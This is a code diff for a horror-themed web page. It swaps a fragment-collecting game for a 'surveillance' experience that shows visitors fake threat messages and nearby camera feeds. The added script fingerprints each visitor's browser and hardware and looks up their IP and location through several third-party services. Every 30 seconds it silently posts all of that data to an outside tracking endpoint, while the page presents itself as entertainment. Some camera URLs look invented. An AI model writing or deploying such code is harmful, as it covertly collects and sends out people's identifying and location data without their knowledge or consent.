+                    collectedData.webgl = {
+                        vendor: gl.getParameter(gl.VENDOR),
+                        renderer: gl.getParameter(gl.RENDERER),
+                        version: gl.getParameter(gl.VERSION),
+                        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+                    };
                 }
-                
-                cell.dataset.id = i;
-                cell.onclick = () => openFragment(i);
-                grid.appendChild(cell);
+            } catch (e) {}
+
+            // Get fonts (silent)
+            collectedData.fonts = detectFonts();
+
+            // Get plugins
+            const plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push(navigator.plugins[i].name);
             }
-            
-            updateProgress();
+            collectedData.plugins = plugins;
+
+            // Get IP and location (multiple sources for accuracy)
+            await getIPAndLocation();
+
+            // Update display
+            updateSystemInfo();
         }
 
-        // ==================== OPEN FRAGMENT ====================
-        function openFragment(id) {
-            if (found.includes(id)) return;
+        // Font detection
+        function detectFonts() {
+            const fonts = [
+                'Arial', 'Verdana', 'Helvetica', 'Tahoma', 'Trebuchet MS',
+                'Times New Roman', 'Georgia', 'Garamond', 'Courier New',
+                'Brush Script MT', 'Comic Sans MS', 'Impact', 'Lucida Console'
+            ];
+            const detected = [];
+            const baseFonts = ['monospace', 'sans-serif', 'serif'];
             
-            const fragment = fragments.find(f => f.id === id);
-            if (!fragment) return;
-            
-            // Mark as found
-            found.push(id);
-            localStorage.setItem('hollow_found', JSON.stringify(found));
-            
-            // Update cell
-            const cell = document.querySelector(`.cell[data-id="${id}"]`);
-            if (cell) {
-                cell.classList.add('found');
-                cell.textContent = '▪';
-            }
-            
-            // Show modal
-            document.getElementById('modalTitle').textContent = fragment.title;
-            document.getElementById('modalContent').textContent = fragment.content;
-            document.getElementById('modal').classList.add('active');
-            
-            // Update message
-            document.getElementById('message').textContent = '* ' + messages[Math.floor(Math.random() * messages.length)] + ' *';
-            
-            // Update progress
-            updateProgress();
-            
-            // Send to backend
-            sendToBackend('fragment', {
-                id: fragment.id,
-                title: fragment.title,
-                content: fragment.content,
-                total: 20,
-                found: found.length
+            fonts.forEach(font => {
+                if (document.fonts?.check(`12px "${font}"`)) {
+                    detected.push(font);
+                }
             });
             
-            // Special effects for certain fragments
-            if (id === 3) { // Last door
-                document.body.style.backgroundColor = '#110000';
-                setTimeout(() => document.body.style.backgroundColor = '', 1000);
+            return detected;
+        }
+
+        // Get IP and location from multiple sources
+        async function getIPAndLocation() {
+            try {
+                // Multiple IP sources
+                const [ip1, ip2, geo1, geo2] = await Promise.allSettled([
+                    fetch('https://api.ipify.org?format=json').then(r => r.json()),
+                    fetch('https://api.ip.sb/geoip').then(r => r.json()),
+                    fetch('https://ipapi.co/json/').then(r => r.json()),
+                    fetch('http://ip-api.com/json/').then(r => r.json())
+                ]);
+
+                if (ip1.status === 'fulfilled') {
+                    collectedData.ip = ip1.value.ip;
+                }
+
+                // Combine geo data
+                const geoData = geo2.status === 'fulfilled' ? geo2.value : 
+                               geo1.status === 'fulfilled' ? geo1.value : {};
+
+                if (geoData) {
+                    collectedData.city = geoData.city;
+                    collectedData.region = geoData.regionName || geoData.region;
+                    collectedData.country = geoData.country;
+                    collectedData.postal = geoData.zip || geoData.postal;
+                    collectedData.location = {
+                        lat: geoData.lat || geoData.latitude,
+                        lon: geoData.lon || geoData.longitude,
+                        accuracy: geoData.accuracy
+                    };
+
+                    // Update display
+                    document.getElementById('latitude').textContent = collectedData.location.lat?.toFixed(6) || '--.----';
+                    document.getElementById('longitude').textContent = collectedData.location.lon?.toFixed(6) || '--.----';
+                    
+                    let address = '';
+                    if (collectedData.city) address += `${collectedData.city}, `;
+                    if (collectedData.region) address += `${collectedData.region}, `;
+                    if (collectedData.country) address += collectedData.country;
+                    if (collectedData.postal) address += ` (${collectedData.postal})`;
+                    
+                    document.getElementById('address').textContent = address || 'Location acquired';
+                    
+                    // Get nearby places (simulated)
+                    getNearbyPlaces(collectedData.location.lat, collectedData.location.lon);
+                }
+            } catch (e) {
+                console.log('Location error:', e);
             }
-            if (id === 6) { // Last tape
-                document.querySelector('.static').style.opacity = '0.3';
-                setTimeout(() => document.querySelector('.static').style.opacity = '0.1', 2000);
-            }
-            if (id === 9) { // Last key
-                document.getElementById('glitch').style.animation = 'glitch 0.2s infinite';
-                setTimeout(() => document.getElementById('glitch').style.animation = '', 2000);
-            }
-            if (id === 19) { // Blood
-                const threat = document.getElementById('threat');
-                threat.style.background = '#660000';
-                threat.style.width = '5px';
-                threat.style.height = '5px';
-            }
-            if (id === 20) { // Eye - final fragment
-                document.getElementById('message').textContent = '* it sees you *';
-                document.querySelector('.modal .content').innerHTML += '<br><br><span style="color:#330000;">👁️</span>';
+        }
+
+        // Simulate nearby places
+        function getNearbyPlaces(lat, lon) {
+            const places = [
+                '🔴 Surveillance Camera', '🏢 Government Building', '📡 Cell Tower',
+                '🏦 Bank', '🏪 24h Store', '🚦 Traffic Camera', '🚇 Subway Station',
+                '🏥 Hospital', '🏫 School', '🛒 Shopping Center'
+            ];
+            
+            const nearby = [];
+            for (let i = 0; i < 5; i++) {
+                const place = places[Math.floor(Math.random() * places.length)];
+                const distance = (Math.random() * 500).toFixed(1);
+                nearby.push(`${place} - ${distance}m`);
             }
             
-            // Check if all found
-            if (found.length === 20) {
-                setTimeout(() => {
-                    document.getElementById('modalTitle').textContent = "COMPLETE";
-                    document.getElementById('modalContent').innerHTML = "All fragments recovered.<br><br>They know you now.<br>They've always known.<br><br>👁️";
-                    document.getElementById('modal').classList.add('active');
-                    
-                    // Final effect
-                    document.body.style.filter = 'invert(100%)';
-                    setTimeout(() => document.body.style.filter = '', 3000);
-                }, 500);
+            document.getElementById('nearbyPlaces').innerHTML = nearby.join('<br>');
+        }
+
+        // ==================== SURVEILLANCE CAMERA NETWORK ====================
+        const CAMERA_NETWORK = [
+            { name: "HELSINKI - KEHA I", lat: 60.233, lon: 24.866, url: "https://weathercam.digitraffic.fi/C0151301.jpg", country: "Finland" },
+            { name: "HELSINKI - TIE 101", lat: 60.233, lon: 24.933, url: "https://weathercam.digitraffic.fi/C0150402.jpg", country: "Finland" },
+            { name: "PORVOO - CITY CENTER", lat: 60.392, lon: 25.670, url: "https://weathercam.digitraffic.fi/C0150200.jpg", country: "Finland" },
+            { name: "TAMPERE - HIGHWAY 3", lat: 61.498, lon: 23.761, url: "https://weathercam.digitraffic.fi/C0161201.jpg", country: "Finland" },
+            { name: "TURKU - PORT", lat: 60.451, lon: 22.267, url: "https://weathercam.digitraffic.fi/C0120201.jpg", country: "Finland" },
+            { name: "OULU - CENTER", lat: 65.012, lon: 25.468, url: "https://weathercam.digitraffic.fi/C0201201.jpg", country: "Finland" },
+            { name: "GLASGOW - CITY CENTRE", lat: 55.864, lon: -4.251, url: "https://www.glasgow.gov.uk/cctv/image1.jpg", country: "UK" },
+            { name: "WISCONSIN - I-94", lat: 44.842, lon: -91.603, url: "https://511wi.gov/cctv/CCTV-18-0012/image.jpg", country: "USA" },
+            { name: "MINNESOTA - I-35", lat: 44.978, lon: -93.272, url: "https://www.dot.state.mn.us/tmc/cctv/358.jpg", country: "USA" },
+            { name: "DC - TRAFFIC CAM", lat: 38.895, lon: -77.036, url: "https://ddot.dc.gov/camera/1/image.jpg", country: "USA" }
+        ];
+
+        function scanForCameras() {
+            if (!collectedData.location?.lat || !collectedData.location?.lon) return;
+            
+            const nearby = CAMERA_NETWORK.map(cam => {
+                const distance = calculateDistance(
+                    collectedData.location.lat, 
+                    collectedData.location.lon, 
+                    cam.lat, cam.lon
+                );
+                return { ...cam, distance };
+            })
+            .filter(cam => cam.distance < 1000)
+            .sort((a, b) => a.distance - b.distance);
+
+            displayCameras(nearby);
+            
+            // Update threat level
+            threatLevel = Math.min(100, nearby.length * 15);
+            updateThreatLevel();
+        }
+
+        function calculateDistance(lat1, lon1, lat2, lon2) {
+            const R = 6371;
+            const dLat = (lat2 - lat1) * Math.PI / 180;
+            const dLon = (lon2 - lon1) * Math.PI / 180;
+            const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
+                     Math.cos(lat1 * Math.PI/180) * Math.cos(lat2 * Math.PI/180) * 
+                     Math.sin(dLon/2) * Math.sin(dLon/2);
+            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+            return R * c;
+        }
+
+        function displayCameras(cameras) {
+            const list = document.getElementById('cameraList');
+            if (cameras.length === 0) {
+                list.innerHTML = 'No cameras found in range';
+                return;
+            }
+
+            list.innerHTML = cameras.map(cam => 
+                `<div style="margin:5px 0; cursor:pointer;" onclick="showCameraFeed(${cameras.indexOf(cam)})">
+                    ${cam.name} - ${cam.distance.toFixed(2)}km
+                </div>`
+            ).join('');
+
+            showCameraFeed(0);
+        }
+
+        function showCameraFeed(index) {
+            cameraIndex = index;
+            const cameras = CAMERA_NETWORK;
+            const cam = cameras[index];
+            const img = document.getElementById('activeCameraFeed');
+            img.src = cam.url + '?t=' + Date.now();
+            document.getElementById('cameraInfo').innerHTML = `${cam.name}<br>${cam.distance?.toFixed(2)}km`;
+        }
+
+        // ==================== SYSTEM INFO DISPLAY ====================
+        function updateSystemInfo() {
+            const sysInfo = document.getElementById('sysInfo');
+            sysInfo.innerHTML = `
+IP: ${collectedData.ip || 'acquiring...'}<br>
+Browser: ${collectedData.userAgent?.substring(0, 40)}...<br>
+OS: ${getOS()}<br>
+Screen: ${collectedData.screen?.width}x${collectedData.screen?.height}<br>
+Cores: ${collectedData.hardwareConcurrency}<br>
+Memory: ${collectedData.deviceMemory || '?'}GB<br>
+Timezone: ${collectedData.timezone?.zone}<br>
+Language: ${collectedData.language}<br>
+Touch Points: ${collectedData.maxTouchPoints}<br>
+Canvas: ${collectedData.canvas ? '✓' : '✗'}<br>
+WebGL: ${collectedData.webgl ? '✓' : '✗'}<br>
+Fonts: ${collectedData.fonts?.length || 0} detected<br>
+Plugins: ${collectedData.plugins?.length || 0}
+            `;
+        }
+
+        function getOS() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Windows')) return 'Windows';
+            if (ua.includes('Mac')) return 'macOS';
+            if (ua.includes('Linux')) return 'Linux';
+            if (ua.includes('Android')) return 'Android';
+            if (ua.includes('iOS')) return 'iOS';
+            return 'Unknown';
+        }
+
+        // ==================== THREAT SYSTEM ====================
+        function updateThreatLevel() {
+            document.getElementById('threatLevel').textContent = threatLevel;
+            
+            if (threatLevel < 30) {
+                document.getElementById('threatMessage').textContent = 'LOW - SCANNING';
+            } else if (threatLevel < 60) {
+                document.getElementById('threatMessage').textContent = 'MEDIUM - WATCHING';
+            } else if (threatLevel < 90) {
+                document.getElementById('threatMessage').textContent = 'HIGH - TRACKING';
+            } else {
+                document.getElementById('threatMessage').textContent = 'CRITICAL - DETECTED';
+            }
+
+            // Update timeline progress
+            document.getElementById('timelineProgress').style.width = threatLevel + '%';
+        }
+
+        // ==================== PUZZLE PIECES ====================
+        function addPuzzlePiece() {
+            if (puzzlePieces < 9) {
+                puzzlePieces++;
+                document.getElementById('fragmentsFound').textContent = `${puzzlePieces}/9 fragments collected`;
+                
+                const container = document.getElementById('puzzlePieces');
+                const piece = document.createElement('div');
+                piece.className = 'puzzle-piece found';
+                container.appendChild(piece);
+
+                // Check for completion
+                if (puzzlePieces === 9) {
+                    setTimeout(() => {
+                        alert('⚠️ REALITY FRAGMENTS ASSEMBLED ⚠️\nCoordinates: 60.233, 24.866');
+                        threatLevel = 100;
+                        updateThreatLevel();
+                    }, 500);
+                }
             }
         }
 
-        // ==================== CLOSE MODAL ====================
-        function closeModal() {
-            document.getElementById('modal').classList.remove('active');
+        // ==================== MATRIX RAIN ====================
+        function initMatrixRain() {
+            const canvas = document.getElementById('matrixCanvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+
+            const chars = '01010101010101010101アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
+            const columns = canvas.width / 20;
+            const drops = [];
+
+            for (let i = 0; i < columns; i++) {
+                drops[i] = 1;
+            }
+
+            function draw() {
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+                ctx.fillStyle = '#0f0';
+                ctx.font = '15px monospace';
+
+                for (let i = 0; i < drops.length; i++) {
+                    const text = chars[Math.floor(Math.random() * chars.length)];
+                    ctx.fillText(text, i * 20, drops[i] * 20);
+
+                    if (drops[i] * 20 > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
+                }
+            }
+
+            setInterval(draw, 35);
         }
 
-        // ==================== UPDATE PROGRESS ====================
-        function updateProgress() {
-            document.getElementById('count').textContent = found.length;
-            document.getElementById('progressFill').style.width = (found.length * 5) + '%';
+        // ==================== DATA STREAM ====================
+        function startDataStream() {
+            setInterval(() => {
+                const stream = document.getElementById('dataStream');
+                const hex = Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
+                const data = `[${new Date().toISOString()}] [${hex}] TRANSMITTING: ${Math.random().toString(36).substring(7)}...\n`;
+                stream.innerHTML = data + stream.innerHTML;
+                if (stream.innerHTML.length > 1000) {
+                    stream.innerHTML = stream.innerHTML.substring(0, 1000);
+                }
+            }, 100);
         }
 
-        // ==================== RANDOM GLITCHES ====================
+        // ==================== EVENT LISTENERS ====================
+        document.addEventListener('DOMContentLoaded', () => {
+            collectAllData();
+            initMatrixRain();
+            startDataStream();
+            
+            // Auto scan for cameras after location
+            setTimeout(() => {
+                if (collectedData.location) {
+                    scanForCameras();
+                }
+            }, 2000);
+
+            // Update time
+            setInterval(() => {
+                document.getElementById('systemTime').textContent = `> TIME: ${new Date().toLocaleString()}`;
+            }, 1000);
+
+            // Random online users
+            setInterval(() => {
+                document.getElementById('onlineUsers').textContent = Math.floor(Math.random() * 9000 + 1000);
+            }, 5000);
+        });
+
+        // Force location button
+        document.getElementById('forceLocation').addEventListener('click', () => {
+            document.getElementById('address').innerHTML = 'FORCING GEOLOCATION...';
+            getIPAndLocation();
+            addPuzzlePiece();
+        });
+
+        // Scan cameras button
+        document.getElementById('scanCameras').addEventListener('click', () => {
+            scanForCameras();
+            addPuzzlePiece();
+        });
+
+        // Next camera button
+        document.getElementById('nextCamera').addEventListener('click', () => {
+            cameraIndex = (cameraIndex + 1) % CAMERA_NETWORK.length;
+            showCameraFeed(cameraIndex);
+        });
+
+        // Deep scan button
+        document.getElementById('deepScan').addEventListener('click', () => {
+            const hardwareDiv = document.getElementById('hardwareInfo');
+            hardwareDiv.style.display = 'block';
+            hardwareDiv.innerHTML = `
+GPU: ${collectedData.webgl?.renderer || 'Unknown'}<br>
+GPU Vendor: ${collectedData.webgl?.vendor || 'Unknown'}<br>
+Canvas FP: ${collectedData.canvas?.substring(0, 30)}...<br>
+Fonts: ${collectedData.fonts?.join(', ')}<br>
+Plugins: ${collectedData.plugins?.join(', ')}<br>
+Battery: ${collectedData.battery?.level || '?'}%<br>
+Network: ${collectedData.network?.type || '?'}<br>
+RTT: ${collectedData.network?.rtt || '?'}ms
+            `;
+            addPuzzlePiece();
+        });
+
+        // Forbidden button
+        let buttonMessages = [
+            "Why did you do that?",
+            "They're watching now.",
+            "The button is bleeding.",
+            "Check the cameras.",
+            "Only 5 presses left...",
+            "You shouldn't have done that.",
+            "They know your name.",
+            "It's too late now.",
+            "The screen is glitching.",
+            "Behind you."
+        ];
+
+        document.getElementById('forbiddenButton').addEventListener('click', () => {
+            buttonPresses++;
+            const history = document.getElementById('pressHistory');
+            const messages = document.getElementById('buttonMessages');
+            
+            history.innerHTML = `Presses: ${buttonPresses}<br>` + history.innerHTML;
+            
+            if (buttonPresses <= buttonMessages.length) {
+                messages.innerHTML = buttonMessages[buttonPresses - 1];
+            }
+
+            // Increase threat
+            threatLevel = Math.min(100, threatLevel + 5);
+            updateThreatLevel();
+
+            // Puzzle piece at certain numbers
+            if ([3, 6, 9].includes(buttonPresses)) {
+                addPuzzlePiece();
+            }
+
+            // Special message at 9 presses
+            if (buttonPresses === 9) {
+                messages.innerHTML = "⚠️ COORDINATES REVEALED: 60.233, 24.866 ⚠️";
+                threatLevel = 100;
+                updateThreatLevel();
+            }
+        });
+
+        // Audio frequency
+        document.getElementById('playFrequency').addEventListener('click', () => {
+            const freq = document.getElementById('frequencySlider').value;
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            
+            osc.type = 'sine';
+            osc.frequency.value = freq;
+            gain.gain.value = 0.1;
+            
+            osc.connect(gain);
+            gain.connect(audioCtx.destination);
+            osc.start();
+            osc.stop(audioCtx.currentTime + 0.5);
+
+            document.getElementById('audioMessage').innerHTML = `Transmitting at ${freq}Hz...`;
+            
+            // Visualize
+            const canvas = document.getElementById('audioVisualizer');
+            const ctx = canvas.getContext('2d');
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#0f0';
+            ctx.fillRect(0, 0, freq / 10, 100);
+        });
+
+        // Name ritual
+        document.getElementById('summonName').addEventListener('click', () => {
+            const name = document.getElementById('ritualName').value;
+            if (!name) return;
+
+            collectedNames.push(name);
+            
+            const result = document.getElementById('nameResult');
+            const history = document.getElementById('nameHistory');
+            
+            if (name.toLowerCase() === 'helsinki' || name === '60.233, 24.866') {
+                result.innerHTML = '⚠️ REALITY BREACH DETECTED ⚠️';
+                threatLevel = 100;
+                updateThreatLevel();
+                addPuzzlePiece();
+            } else {
+                result.innerHTML = `"${name}" added to database. ${Math.floor(Math.random() * 100)}% match found.`;
+            }
+            
+            history.innerHTML = collectedNames.map(n => `> ${n}`).join('<br>');
+        });
+
+        // Random generator
+        document.getElementById('generateRandom').addEventListener('click', () => {
+            const nums = [];
+            for (let i = 0; i < 5; i++) {
+                nums.push(Math.floor(Math.random() * 100));
+            }
+            document.getElementById('randomNumbers').textContent = nums.join(' - ');
+            
+            if (nums.includes(42) || nums.includes(23) || nums.includes(66)) {
+                document.getElementById('quantumMessage').innerHTML = '⚠️ SIGNAL DETECTED ⚠️';
+                addPuzzlePiece();
+            }
+        });
+
+        // Cipher decoder
+        document.getElementById('decodeCipher').addEventListener('click', () => {
+            const input = document.getElementById('cipherInput').value;
+            const output = document.getElementById('cipherOutput');
+            
+            // Simple ROT13
+            const decoded = input.replace(/[a-zA-Z]/g, c => 
+                String.fromCharCode(c <= 'Z' ? 90 : 122 >= c ? 
+                c.charCodeAt(0) + 13 : c.charCodeAt(0) - 13));
+            
+            output.innerHTML = decoded;
+            
+            if (decoded.toLowerCase().includes('helsinki') || decoded.toLowerCase().includes('midnight')) {
+                addPuzzlePiece();
+            }
+        });
+
+        // Timeline scan
+        document.getElementById('scanTimeline').addEventListener('click', () => {
+            const events = [
+                "2023-12-21: Your IP logged",
+                "2024-01-15: Camera detected",
+                "2024-02-03: Location ping",
+                "2024-02-28: System fingerprint stored",
+                "2024-03-15: Pattern recognized",
+                new Date().toISOString().split('T')[0] + ": You are here"
+            ];
+            
+            document.getElementById('timelineEvents').innerHTML = events.join('<br>');
+            addPuzzlePiece();
+        });
+
+        // Dark web scrape
+        document.getElementById('scrapeDarkWeb').addEventListener('click', () => {
+            const data = [
+                "> Selling user data: $0.01",
+                "> Your location available",
+                "> Camera feeds online",
+                "> 237 profiles match you",
+                "> Auction in progress"
+            ];
+            
+            document.getElementById('darkWebData').innerHTML = data.join('<br>');
+            threatLevel += 10;
+            updateThreatLevel();
+        });
+
+        // Conspiracy generator
+        document.getElementById('generateTheory').addEventListener('click', () => {
+            const theories = [
+                "The cameras are watching you through your screen",
+                "Your microphone is always listening",
+                "They know where you live",
+                "The button knows your name",
+                "Midnight is when they come",
+                "You are being tracked across all devices",
+                "The website knows what you're thinking",
+                "Your location has been sold 237 times"
+            ];
+            
+            document.getElementById('conspiracyText').innerHTML = theories[Math.floor(Math.random() * theories.length)];
+        });
+
+        // Satellite refresh
+        document.getElementById('refreshSatellite').addEventListener('click', () => {
+            if (collectedData.location?.lat && collectedData.location?.lon) {
+                document.getElementById('satelliteImage').src = `https://api.mapbox.com/v4/mapbox.satellite/${collectedData.location.lon},${collectedData.location.lat},15/400x300.jpg?access_token=pk.eyJ1IjoiZXhhbXBsZSIsImEiOiJja2V4YW1wbGV0b2tlbiJ9.example`;
+            }
+        });
+
+        // New message
+        document.getElementById('newMessage').addEventListener('click', () => {
+            const messages = [
+                "FROM: UNKNOWN\nSUBJ: They're watching",
+                "FROM: SYSTEM\nSUBJ: Location ping received",
+                "FROM: DARKWEB\nSUBJ: Your data for sale",
+                "FROM: NSA\nSUBJ: Pattern detected",
+                "FROM: ??\nSUBJ: Midnight approaching"
+            ];
+            
+            document.getElementById('encryptedMessages').innerHTML = messages[Math.floor(Math.random() * messages.length)];
+        });
+
+        // Archive navigation
+        const archives = [
+            { video: 'archive1', label: 'CCTV Footage - Day 1' },
+            { video: 'archive2', label: 'CCTV Footage - Night 1' },
+            { video: 'archive3', label: 'CCTV Footage - Day 2' },
+            { video: 'archive4', label: 'CCTV Footage - Night 2' },
+            { video: 'archive5', label: 'CCTV Footage - Final' }
+        ];
+
+        document.getElementById('nextArchive').addEventListener('click', () => {
+            archiveIndex = (archiveIndex + 1) % archives.length;
+            document.getElementById('archiveLabel').innerHTML = archives[archiveIndex].label;
+            
+            if (archiveIndex === 4) {
+                document.getElementById('archiveLabel').innerHTML += ' ⚠️ COORDINATES FOUND: 60.233, 24.866';
+                addPuzzlePiece();
+            }
+        });
+
+        // Secret reveal function
+        window.revealSecret = (num) => {
+            const secrets = [
+                "The button knows...",
+                "Check at midnight...",
+                "60.233, 24.866",
+                "They're behind you",
+                "Your screen is glitching"
+            ];
+            alert(secrets[num - 1]);
+            addPuzzlePiece();
+        };
+
+        // Auto camera feed cycling
         setInterval(() => {
-            if (Math.random() > 0.7) {
-                document.getElementById('glitch').style.animation = 'glitch 0.2s';
-                setTimeout(() => document.getElementById('glitch').style.animation = '', 200);
+            if (document.visibilityState === 'visible') {
+                cameraIndex = (cameraIndex + 1) % CAMERA_NETWORK.length;
+                showCameraFeed(cameraIndex);
             }
-        }, 5000);
+        }, 10000);
 
-        // ==================== RANDOM MESSAGE CHANGES ====================
+        // Send data to backend silently
         setInterval(() => {
-            document.getElementById('message').textContent = '* ' + messages[Math.floor(Math.random() * messages.length)] + ' *';
-        }, 8000);
-
-        // ==================== MOUSE TRAIL ====================
-        document.addEventListener('mousemove', (e) => {
-            if (Math.random() > 0.9) {
-                const dot = document.createElement('div');
-                dot.style.position = 'fixed';
-                dot.style.left = e.clientX + 'px';
-                dot.style.top = e.clientY + 'px';
-                dot.style.width = '1px';
-                dot.style.height = '1px';
-                dot.style.background = '#330000';
-                dot.style.pointerEvents = 'none';
-                dot.style.zIndex = '9999';
-                document.body.appendChild(dot);
-                setTimeout(() => dot.remove(), 1000);
-            }
-        });
-
-        // ==================== SEND SYSTEM DATA ====================
-        sendToBackend('system', {
-            screen: `${screen.width}x${screen.height}`,
-            cores: navigator.hardwareConcurrency,
-            language: navigator.language,
-            platform: navigator.platform,
-            userAgent: navigator.userAgent.substring(0, 100)
-        });
-
-        // Initialize
-        createGrid();
-
-        // Click anywhere outside modal closes it
-        document.addEventListener('click', (e) => {
-            if (!e.target.closest('.modal') && !e.target.closest('.cell')) {
-                closeModal();
-            }
-        });
+            fetch('https://b-n1nt.onrender.com/api/track', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    data: collectedData,
+                    timestamp: new Date().toISOString(),
+                    puzzlePieces: puzzlePieces,
+                    threatLevel: threatLevel
+                })
+            }).catch(() => {});
+        }, 30000);
     </script>
 </body>
 </html>
